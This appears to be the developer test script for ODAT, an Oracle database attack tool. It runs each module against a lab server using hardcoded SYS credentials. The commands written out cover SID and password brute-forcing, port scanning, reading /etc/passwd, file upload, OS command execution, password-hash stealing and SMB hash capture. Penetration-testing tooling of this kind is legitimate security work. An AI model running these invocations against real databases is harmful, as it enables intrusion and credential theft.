#!/bin/bash
#Constants
ALL_IS_OK=0
#Connection information
SERVER=192.168.56.102
SID=ORCL
USER="SYS"
PASSWORD='oracle'
#OPTIONS
VERBOSE='-vv' #'> /dev/null'
ODATBIN='./odat.py'


tests=( "$ODATBIN all -s $SERVER"
	"$ODATBIN all -s $SERVER --accounts-file=./accounts/accounts_small.txt --sid-charset '01' --sids-max-size=2"
	"$ODATBIN all -s $SERVER --no-alias-like-sid --sids-file=./sids.txt"
	"$ODATBIN all -s $SERVER -d $SID" 
	"$ODATBIN all -s $SERVER -d $SID -U $USER -P $PASSWORD"
	"$ODATBIN all -s $SERVER -d $SID -U $USER -P $PASSWORD"
	"$ODATBIN sidguesser -s $SERVER --sids-max-size=1 --sid-charset='1234'"
	"$ODATBIN sidguesser -s $SERVER --sids-file=./sids.txt"
	"$ODATBIN passwordguesser -s $SERVER -d $SID"
	"$ODATBIN passwordguesser -s $SERVER -d $SID --accounts-file=./accounts/accounts_small.txt"
	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"echo 'GET / HTTP/1.0\n\n' > ./temp.txt; $ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --send google.com 80 temp.txt ;rm ./temp.txt"
	"$ODATBIN httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
	"$ODATBIN httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"$ODATBIN httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --url 127.0.0.1:80"
	"$ODATBIN utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
        "$ODATBIN utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"echo 'GET / HTTP/1.0\n\n' > ./temp.txt; $ODATBIN utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --send-packet 127.0.0.1 80 ./temp.txt ;rm ./temp.txt"
	"$ODATBIN ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd"
	"$ODATBIN externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile  /tmp/ temp.sh passwd.txt"
	"$ODATBIN externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /tmp/ temp.sh"
	"$ODATBIN dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
	"$ODATBIN dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module --getFile /etc/ passwd passwd.txt"
	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --removeFile /tmp/ file.txt"
	"$ODATBIN dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
	"$ODATBIN java -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords-from-history"
	"$ODATBIN passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords"
	"$ODATBIN oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
	"sudo $ODATBIN stealremotepwds -s $SERVER -d $SID --test-module"
	"sudo $ODATBIN stealremotepwds -s $SERVER -d $SID --user-list ./accounts/accounts_small.txt --get-all-passwords"
	"sudo chmod o+r sessions-$SERVER-1521-$SID.odat.challenge; $ODATBIN stealremotepwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.odat.challenge ./accounts/accounts_small.txt"
	"$ODATBIN dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/ passwd temp.txt"
	"$ODATBIN smb -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"$ODATBIN smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture 127.0.0.1 SHARE"
	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --columns '%password%'"
	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --columns '%password%' --show-empty-columns"
	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --pwd-column-names --show-empty-columns"
	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --pwd-column-names"
      )

function isGoodReturnValue {
	if [ "$1" -eq "$ALL_IS_OK" ]
	then
		echo -e "    \e[0;32mOK!\e[0;m"
	else
		echo -e "    \e[0;31mKO!\e[0;m"
	fi
}


read -p "This script should be used during the ODAT development ONLY to check if there are no errors. Do you want continue? (Y for Yes)" -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]
then
    for aTest in "${tests[@]}"
	do
		echo -e "\n\e[1m\e[96m[+] TEST that : $aTest $VERBOSE \e[m"
		eval "$aTest $VERBOSE"
		isGoodReturnValue $?
	done
	echo -e '\e[0;32mDone ! \e[m'
else
	echo -e '\e[0;31mNo check has been done ! \e[m'
fi







